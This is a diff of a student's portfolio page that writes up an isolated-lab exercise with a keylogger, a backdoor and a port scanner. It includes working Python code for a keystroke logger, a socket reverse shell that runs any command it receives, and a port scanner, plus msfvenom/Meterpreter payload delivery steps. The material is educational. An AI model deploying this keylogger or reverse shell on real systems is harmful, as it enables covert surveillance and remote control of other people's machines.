@@ -26,10 +26,9 @@
     <div class="project-hero">
       <a href="../index.html" class="back-link">← All projects</a>
       <span class="card-tag">Cybersecurity</span>
-      <h1>Python Backdoor</h1>
+      <h1>Offensive Security Fundamentals: Keylogger, Backdoor, and Port Scanner</h1>
       <p class="lead">
-        A custom client/server backdoor written in Python using raw socket programming —
-        built as part of a hands-on ethical hacking lab inside a controlled virtual machine environment.
+        intro
       </p>
     </div>
 
@@ -50,141 +49,280 @@
         </div>
         <div class="meta-item">
           <span class="label">Course</span>
-          <span class="value">Zero to Mastery – Cybersecurity</span>
+          <span class="value">Zero to Mastery - Cybersecurity</span>
         </div>
       </div>
 
-      <!-- Replace this with a real screenshot when you have one -->
-      <div class="image-placeholder">screenshot / demo GIF goes here</div>
+      <h1>Objective</h1>
+        <p>
+          The goal of this project was to get hands-on practice with three classic offensive security building 
+          blocks: a keylogger, a backdoor, and a port scanner. For each one, I go through it twice, 
+          first using an existing tool, to understand the workflow and the principles behind it quickly, and then 
+          again by writing a simplified version myself in Python. Being able to use a tool is useful, but being able 
+          to code and adapt the underlying logic myself felt like the more durable skill to build toward.
+        </p>
 
-      <h2>What it does</h2>
-      <p>
-        The backdoor consists of two Python scripts: a server running on a Kali Linux attacker
-        machine and a client planted on a Windows target VM. Once a connection is established,
-        the server can send shell commands and receive the output in real time.
-      </p>
-
-      <h2>How it was built</h2>
+      <h1>Environment</h1>
       <ul>
-        <li>Used Python's <code>socket</code> module to set up a raw TCP connection between the two VMs.</li>
-        <li>Configured both machines on a VirtualBox internal network with static IPs.</li>
-        <li>Implemented a persistent connection loop so the backdoor reconnects if dropped.</li>
-        <li>Bypassed Windows Defender interference during testing by adjusting exclusion paths.</li>
+        <li><b>Kali Linux</b> - attacker machine</li>
+        <li><b>Windows</b> - target machine</li>
+        <li>Both machines hosted as VirtualBox VMs, to keep the work isolated from my own machine and to allow a proper 
+          attacker/target scenario</li>
       </ul>
 
-      <h2>What I learned</h2>
+      <p><strong>Worth stating clearly: everything here was done in my own isolated lab, against my own VMs. Trying any 
+        of this on a system you don't own or don't have explicit permission to test is illegal — this is purely for learning.</strong></p>
+
+
+      <h1>Method</h1>
+      <h2>Keylogger</h2>
       <p>
-        This lab gave me hands-on experience with low-level networking concepts — how sockets work,
-        how commands travel over a connection, and how defenders detect this kind of traffic.
-        Debugging the VM networking (internal vs. NAT adapters, static IPs via <code>/etc/network/interfaces</code>)
-        was a challenge in itself and taught me a lot about Linux network configuration.
+        <h4>With Kali Linux (Metasploit):</h4>
+         Using <b>LHOST = 192.168.100.1</b> and <b>LPORT = 4444</b>, I generated a Windows reverse-TCP 
+        Meterpreter payload with <b>msfvenom</b>, set up a matching listener in <b>msfconsole</b> via <b>exploit/multi/handler</b>, then transferred 
+        the payload to the target using a quick Python HTTP server (<code>python3 -m http.server 8000</code>) and <code>wget</code> on the Windows side. 
+        Executing the payload on the target opened a Meterpreter session on the attacker machine, from which <code>keyscan_start</code> and 
+        <code>keyscan_dump</code> captured and displayed keystrokes typed on the target since the keylogger started.
       </p>
+
+      <img src="../assets/images/Backdoor/Meterpreter_keylogger_output.png"
+            alt="Meterpreter keylogger output"
+            class="screenshot">
+
+      <p>
+        <h4>In Python</h4>
+        I then wrote a simplified version myself using the <b>keyboard</b> library, which allows hooking global keyboard events. Using 
+        <code>keyboard.on_press()</code>, every key-down event triggers a callback (<code>on_key_press</code>) that appends the key name 
+        to a local <b>keystrokes.log</b> file. <code>keyboard.wait()</code> keeps the program running (similar to a <code>while True</code> loop) 
+        until manually stopped. Unlike the Metasploit version, this one only logs locally rather than exfiltrating to an attacker machine, 
+        though that's a fairly small step to add later.
+      </p>
+      
+      <pre><code>
+        import keyboard
+        log_file = "keystrokes.log"
+ 
+        def on_key_press(event):
+          with open(log_file, "a") as f:
+            f.write(event.name)
+ 
+        keyboard.on_press(on_key_press)
+        keyboard.wait()
+      </code></pre>
+
+      <img src="../assets/images/Backdoor/keystroke_output.png"
+            alt="Keystroke output"
+            class="screenshot">
+
+      <h2>Backdoor</h2>
+      <p>
+        <h4>With Kali Linux (Metasploit):</h4>
+          Starting from the same Meterpreter shell setup as the keylogger, I explored the available post-exploitation commands 
+          via <code>help</code>. I tried the <code>screenshot</code> command (captures the target's current desktop), <code>screenshare</code> 
+          (live remote view of the target desktop), <code>sysinfo</code> (returns OS details, logged-in users, and other system info), and 
+          <code>shell</code> (drops into a native command line on the target).
+      </p>
+
+      <img src="../assets/images/Backdoor/screenshot_cmd_target.png"
+            alt="Keystroke output"
+            class="screenshot">
+
+      <img src="../assets/images/Backdoor/sysinfo_output.png"
+            alt="Keystroke output"
+            class="screenshot">
+
+      <p>
+        <h4>In Python</h4>
+        I then wrote a simplified client-server backdoor myself. The server binds to a host/port and listens for a connection; once a client 
+        connects, it repeatedly prompts for a shell command, sends it to the client, and prints back whatever the client returns. The client 
+        connects to the server, and in a loop receives a command, executes it locally via <code>subprocess.run()</code>, and sends the 
+        combined stdout/stderr back to the server.
+      </p>
+
+
+      <pre><code>
+        // Server
+        import socket
+ 
+        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        host = '192.168.100.1'
+        port = 4444
+ 
+        serversocket.bind((host, port))
+        serversocket.listen(1)
+ 
+        while True:
+          clientsocket, addr = serversocket.accept()
+          print(f"Connection from {addr}")
+ 
+          message = 'Welcome to the server!'
+          clientsocket.send(message.encode())
+ 
+          while True:
+            command = input("Shell> ")
+            clientsocket.send(command.encode())
+ 
+            output = clientsocket.recv(4096).decode()
+            print(output)
+ 
+        clientsocket.close()
+    </code></pre>
+
+      <pre><code>
+        // Client
+        import socket
+        import subprocess
+    
+        clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        host = '192.168.100.1'
+        port = 4444
+    
+        clientsocket.connect((host, port))
+    
+        message = clientsocket.recv(1024).decode()
+        print(message)
+    
+        while True:
+          command = clientsocket.recv(1024).decode()
+          result = subprocess.run(command, shell=True, capture_output=True, text=True)
+          output = result.stdout + result.stderr
+          clientsocket.send(output.encode())
+    
+        clientsocket.close()
+      </code></pre>
+
+      <img src="../assets/images/Backdoor/clientconnect.png"
+            alt="Client connecting to server"
+            class="screenshot">
+      
+      <img src="../assets/images/Backdoor/serverissuecmd.png"
+            alt="Server issuing a command"
+            class="screenshot">
+      
+      <img src="../assets/images/Backdoor/cmdoutput.png"
+            alt="Command output returned to the server"
+            class="screenshot">
+
+      <h2>Portscanner</h2>
+
+      <p>
+        Port scanning reveals which ports on a target are open, closed, or filtered behind a firewall. 
+        Paired with a tool like Nmap, it also reveals what software or service is running on each open 
+        port — information that can then be checked against known vulnerabilities for that specific software version.
+      </p>
+
+      <p>
+      <h4>With Kali Linux (Nmap):</h4>
+        A basic <code>nmap &lt;ip&gt;</code> scan against the Windows VM returned the open ports and 
+        the services running on them.
+      </p>
+
+      <img src="../assets/images/Backdoor/basicnmap.png"
+            alt="Basic Nmap scan output"
+            class="screenshot">
+
+      <p>
+        Adding the <code>-sV</code> flag returns the exact version of each service, which is what actually makes 
+        the scan useful for vulnerability research — knowing <em>a</em> web server is running is far less actionable 
+        than knowing it's a specific version with a documented CVE.
+      </p>
+
+      <img src="../assets/images/Backdoor/nmap_version.png"
+            alt="Nmap scan with service version detection"
+            class="screenshot">
+
+      <p>
+        <h4>In Python:</h4>
+        For the final part, I wrote a simple port scanner using the <code>socket</code> library. The user specifies 
+        a target IP and how many ports to scan (from port 1 up to that number); the scanner attempts a connection 
+        to each port with a short timeout, and reports any that are open. If the connection returns additional data 
+        on connect (a banner), that's captured and displayed alongside the port number.
+      </p>
+
+      <pre><code>
+        import socket
+ 
+        # Captures any additional information sent along the connection
+        def get_banner(s):
+            return s.recv(1024)
+        
+        # Scan one individual port
+        def scan_port(addr, port):
+            try:
+                sock = socket.socket()
+                sock.settimeout(0.3)
+                sock.connect((addr, port))
+        
+                try:
+                    banner = get_banner(sock)
+                    print('[+] Open Port ' + str(port) + ' :' + str(banner.decode().strip('\n')))
+                except:
+                    print('[+] Open Port ' + str(port))
+                sock.close()
+        
+            except (socket.timeout, ConnectionRefusedError):
+                pass
+        
+        def scan(target, ports):
+            print('\n' + '*** Starting scan for ' + str(target) + ' ***')
+            for port in range(1, ports):
+                scan_port(target, port)
+        
+        target = input('[+] Enter target to scan: ')
+        print('\n' + 'The scan is conducted consecutively, from port 1 up until the specified number of ports.')
+        ports = int(input('[+] Enter how many ports to scan: ')) + 1
+        scan(target, ports)
+      </code></pre>
+
+      <img src="../assets/images/Backdoor/python_portscanner_output.png"
+            alt="Python port scanner output"
+            class="screenshot">
+
+      <blockquote class="reflection">
+        <h3>Reflection: What writing the Python versions actually taught me</h3>
+        <p>
+          Using Metasploit and Nmap first was the right call for getting oriented quickly, but writing the simplified 
+          Python versions afterward is where the actual understanding clicked into place. With Metasploit, 
+          <code>keyscan_start</code> and <code>keyscan_dump</code> just work — there's no visibility into how keystrokes 
+          are being captured and shipped back. Writing the keylogger myself made it obvious that it's really just a callback 
+          registered against key-press events, appending to a file. Same with the backdoor: Meterpreter gives you a 
+          fully-featured remote shell, but building the client-server version myself made the actual mechanic clear — a socket 
+          connection, a loop that sends a command and waits for output, and <code>subprocess.run()</code> doing the real execution 
+          on the other end. None of my versions are as capable as the tool equivalents (no encryption, no persistence, no evasion), 
+          but that gap is exactly what made the comparison useful — it showed me which parts of a "real" tool are the hard, 
+          engineered parts, versus which parts are conceptually simple once you strip the polish away.
+        </p>
+      </blockquote>
+
+      <blockquote class="reflection">
+        <h3>Reflection: Cross-platform friction was its own lesson</h3>
+        <p>
+          A good chunk of the actual difficulty in this project had nothing to do with the security concepts themselves — it was 
+          getting a Windows VM working correctly as a target. Between figuring out how to actually run a downloaded executable, 
+          adjusting network settings, and disabling firewall rules that were silently blocking the exact traffic I was trying to 
+          generate, I spent more time on VM/OS setup friction than on the exploitation logic. In hindsight, that's a realistic 
+          reflection of the work itself: a lot of offensive (and defensive) security work is less about clever exploits and more 
+          about patiently working through environment-specific quirks until the thing you're testing actually behaves the way your 
+          diagram says it should.
+        </p>
+      </blockquote>
+
+      <h1>Overall Takeaways</h1>
+        <ul>
+          <li>Using a mature tool first (Metasploit, Nmap) is a fast way to understand a technique's workflow and outcome, but re-implementing 
+            a simplified version in code is what actually builds transferable understanding of the underlying mechanism.</li>
+          <li>Tools abstract away real complexity — encryption, persistence, evasion — that's easy to overlook when a single command "just works."</li>
+          <li>Nmap's basic scan tells you what's open; the <code>-sV</code> flag is what turns that into something actionable, by identifying exact s
+            ervice versions that can be checked against known vulnerabilities.</li>
+          <li>A meaningful share of practical security work is cross-platform setup friction (networking, firewalls, OS-specific execution quirks) 
+            rather than the "exploit" itself.</li>
+        </ul>
+
 
       <div class="tag-row">
-        <span class="tag">Python</span>
-        <span class="tag">Sockets</span>
-        <span class="tag">Kali Linux</span>
-        <span class="tag">VirtualBox</span>
-        <span class="tag">Ethical hacking</span>
-        <span class="tag">Networking</span>
-      </div>
-
-    </div>
-
-  </article>
-
-  <footer class="site-footer">
-    <p>Marie · Built with GitHub Pages</p>
-    <div class="footer-links">
-      <a href="https://github.com/yourusername" target="_blank">GitHub</a>
-      <a href="mailto:you@example.com">Email</a>
-    </div>
-  </footer>
-
-</body>
-</html><!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Python Backdoor — Marie</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="../assets/css/style.css" />
-</head>
-<body>
-
-  <header class="site-header">
-    <div class="header-inner">
-      <a href="../index.html" class="logo">marie<span class="accent">.</span></a>
-      <nav>
-        <a href="../index.html#projects">Projects</a>
-        <a href="mailto:you@example.com">Contact</a>
-      </nav>
-    </div>
-  </header>
-
-  <article>
-
-    <div class="project-hero">
-      <a href="../index.html" class="back-link">← All projects</a>
-      <span class="card-tag">Cybersecurity</span>
-      <h1>Python Backdoor</h1>
-      <p class="lead">
-        A custom client/server backdoor written in Python using raw socket programming —
-        built as part of a hands-on ethical hacking lab inside a controlled virtual machine environment.
-      </p>
-    </div>
-
-    <div class="project-body">
-
-      <div class="meta-row">
-        <div class="meta-item">
-          <span class="label">Type</span>
-          <span class="value">Lab / Cybersecurity</span>
-        </div>
-        <div class="meta-item">
-          <span class="label">Language</span>
-          <span class="value">Python</span>
-        </div>
-        <div class="meta-item">
-          <span class="label">Environment</span>
-          <span class="value">Kali Linux + Windows VM</span>
-        </div>
-        <div class="meta-item">
-          <span class="label">Course</span>
-          <span class="value">Zero to Mastery – Cybersecurity</span>
-        </div>
-      </div>
-
-      <!-- Replace this with a real screenshot when you have one -->
-      <div class="image-placeholder">screenshot / demo GIF goes here</div>
-
-      <h2>What it does</h2>
-      <p>
-        The backdoor consists of two Python scripts: a server running on a Kali Linux attacker
-        machine and a client planted on a Windows target VM. Once a connection is established,
-        the server can send shell commands and receive the output in real time.
-      </p>
-
-      <h2>How it was built</h2>
-      <ul>
-        <li>Used Python's <code>socket</code> module to set up a raw TCP connection between the two VMs.</li>
-        <li>Configured both machines on a VirtualBox internal network with static IPs.</li>
-        <li>Implemented a persistent connection loop so the backdoor reconnects if dropped.</li>
-        <li>Bypassed Windows Defender interference during testing by adjusting exclusion paths.</li>
-      </ul>
-
-      <h2>What I learned</h2>
-      <p>
-        This lab gave me hands-on experience with low-level networking concepts — how sockets work,
-        how commands travel over a connection, and how defenders detect this kind of traffic.
-        Debugging the VM networking (internal vs. NAT adapters, static IPs via <code>/etc/network/interfaces</code>)
-        was a challenge in itself and taught me a lot about Linux network configuration.
-      </p>
-
-      <div class="tag-row">
+        <span class="tag">Keylogger</span>
+        <span class="tag">Backdoor</span>
+        <span class="tag">Portscanner</span>
         <span class="tag">Python</span>
         <span class="tag">Sockets</span>
         <span class="tag">Kali Linux</span>
@@ -205,6 +343,5 @@
     </div>
   </footer>
 
-  <script src="../assets/js/matrix-rain.js" defer></script>
 </body>
 </html>
